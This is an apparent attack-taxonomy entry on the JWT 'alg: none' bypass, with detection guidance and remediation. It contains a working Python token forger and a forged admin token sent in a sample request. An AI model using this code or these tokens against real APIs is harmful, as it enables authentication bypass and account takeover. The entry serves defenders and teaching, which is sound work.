# ASTRA-AUTH-001 — JWT None Algorithm Bypass

## Overview

JSON Web Tokens (JWTs) rely on a cryptographic signature to prove authenticity. The JWT specification includes an `alg` field in the header that declares which algorithm was used to sign the token. A critical vulnerability exists in naive JWT libraries: if they accept `"alg": "none"`, an attacker can forge a valid-looking JWT with any payload — including elevated privileges — by simply setting the algorithm to `none` and omitting the signature. The API accepts this unsigned token as legitimate.

This is not a theoretical attack. Multiple major JWT libraries shipped with this bug and it has been exploited in production systems.

## Tactic
Authentication Abuse

## Protocols
REST · GraphQL

## Severity Score

| Dimension | Score (1–5) | Rationale |
|-----------|-------------|-----------|
| Exploitability | 4 | Requires JWT knowledge; no crypto needed |
| Prevalence | 3 | Less common now but still found in legacy systems |
| Data sensitivity | 5 | Full account takeover / privilege escalation |
| Business impact | 5 | Complete authentication bypass |
| **Composite** | **4.25 / 5** | |

**Rating:** Critical

---

## Attack Scenario

An attacker obtains any valid JWT (e.g. their own, from a legitimate login) and modifies it to claim admin privileges without needing the signing secret.

1. Attacker logs in normally and receives: `eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ1c2VyMTIzIiwicm9sZSI6InVzZXIifQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c`
2. Attacker decodes the header: `{"alg": "HS256", "typ": "JWT"}`
3. Attacker decodes the payload: `{"sub": "user123", "role": "user"}`
4. Attacker modifies: header → `{"alg": "none", "typ": "JWT"}`, payload → `{"sub": "admin", "role": "admin"}`
5. Attacker re-encodes (Base64URL) both parts and appends an empty signature: `eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9.`
6. Attacker sends this forged token — a vulnerable API accepts it as valid

## Example Request / Payload

```python
import base64
import json

# Forge the header
header = {"alg": "none", "typ": "JWT"}
payload = {"sub": "admin", "role": "admin", "iat": 1700000000}

def b64url(data):
    return base64.urlsafe_b64encode(
        json.dumps(data, separators=(',',':')).encode()
    ).rstrip(b'=').decode()

forged_token = f"{b64url(header)}.{b64url(payload)}."
print(forged_token)
```

```http
GET /api/v1/admin/users HTTP/1.1
Host: target.example.com
Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9.
```

---

## Real-World Breach Mapping

| Field | Detail |
|-------|--------|
| Incident | Auth0 JWT none algorithm vulnerability |
| Year | 2015 |
| Organisation | Auth0 (and many downstream applications) |
| What happened | Auth0's node-jsonwebtoken library accepted unsigned JWTs with `alg: none`, allowing any user to forge tokens with arbitrary claims including admin roles |
| ASTRA technique | ASTRA-AUTH-001 |
| Source | https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/ |

---

## Detection

### Sigma Rule
See [detection-rules/sigma/ASTRA-AUTH-001.yml](https://github.com/isha-singhMalik/Astra/blob/main/detection-rules/sigma/ASTRA-AUTH-001.yml)

### What to look for

- JWT tokens in Authorization headers where the decoded header contains `"alg":"none"` or `"alg":"None"` or `"alg":"NONE"`
- Requests where the JWT has only two segments (header.payload — no signature)
- Algorithm downgrade patterns: same user session switching from HS256/RS256 to none
- API gateway logs showing JWT validation errors followed immediately by successful authentication

### WAF / Gateway rule hint

Inspect the Authorization Bearer token. Decode the first segment (Base64URL). Reject any token where the `alg` field resolves to `none`, `None`, `NONE`, or an empty string. This should be enforced at the API gateway layer, not just in application code.

---

## Remediation

1. **Explicitly whitelist allowed algorithms** — configure your JWT library to only accept `HS256`, `RS256`, or your chosen algorithm; never allow `none`
2. **Use a well-maintained JWT library** — avoid rolling your own JWT validation
3. **Validate algorithm on every request** — don't trust the `alg` field from the token; enforce the algorithm server-side
4. **Use asymmetric signing (RS256/ES256) for distributed systems** — harder to downgrade and easier to rotate
5. **Add integration tests** — test that your API rejects `alg: none` tokens before deploying

---

## References

- [Auth0 — Critical vulnerabilities in JWT libraries (2015)](https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/)
- [RFC 7519 — JSON Web Token](https://datatracker.ietf.org/doc/html/rfc7519)
- [PortSwigger — JWT attacks](https://portswigger.net/web-security/jwt)
- [CVE-2015-9235](https://nvd.nist.gov/vuln/detail/CVE-2015-9235)
